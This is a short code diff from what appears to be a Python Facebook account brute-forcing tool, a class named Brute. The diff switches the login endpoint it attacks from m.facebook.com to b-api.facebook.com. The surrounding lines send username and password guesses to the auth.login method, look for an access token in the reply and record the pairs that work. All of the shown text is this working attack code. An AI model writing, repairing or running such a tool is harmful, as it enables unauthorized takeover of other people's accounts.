@@ -36,7 +36,7 @@ class Brute:
 		}
 		try: os.mkdir('out')
 		except: pass
-		api = 'https://m.facebook.com/method/auth.login'
+		api = 'https://b-api.facebook.com/method/auth.login'
 		response = requests.get(api, params=params)
 		if re.search('(EAAA)\w+', response.text):
 			self.ok.append(username+'|'+password)
